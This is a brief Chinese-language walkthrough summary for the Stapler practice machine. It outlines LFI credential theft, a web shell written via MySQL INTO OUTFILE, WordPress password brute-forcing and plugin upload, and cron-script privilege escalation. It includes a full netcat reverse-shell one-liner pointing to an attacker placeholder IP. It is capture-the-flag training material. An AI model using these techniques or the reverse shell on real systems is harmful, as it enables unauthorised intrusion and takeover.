...
# Stapler Walkthrough 簡介

本筆記摘要自詳細報告 [[Stapler]]。以下是該靶機的快速滲透路徑：
...
*   **方法 A（原路徑 - LFI 與 MySQL 寫入）**：
    *   使用 `wpscan` 發現 `advanced-video-embed-...` 外掛存在 LFI（在地檔案包含）漏洞。
    *   利用 LFI 讀取 `/blogblog/wp-config.php`，取得 MySQL 密碼 `root:plbkac`。
    *   登入 MySQL 資料庫，使用 `INTO OUTFILE` 將 Web Shell 寫入 `/var/www/https/blogblog/wp-content/uploads/shell.php`。
    *   存取 Web Shell 並觸發 NC Reverse Shell 取得 `www-data` 權限並取得 `local.txt`。
*   **方法 B（替代路徑 - WordPress 帳密爆破與外掛上傳）**：
    *   使用 `wpscan` 列舉使用者，並搭配 `rockyou.txt` 進行密碼爆破，成功取得管理員 `john` 的憑證。
    *   登入 `/wp-login.php` 後台，透過 `Plugins > Add New > Upload Plugin` 功能上傳 PHP Shell 的 ZIP 檔案（FTP 提示直接留空）。
...
*   **方法 A（原路徑 - .bash_history 敏感資訊洩漏與 Sudo 提權）**：
    *   由於各使用者目錄權限為 `755`，`www-data` 可讀取其 `.bash_history` 歷史指令。
...
*   **方法 B（替代路徑 - 可寫 Cron Job 腳本提權）**：
    ...
    *   將 Reverse Shell 指令（如 `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> 4444 >/tmp/f`）寫入該 `.sh` 檔案。
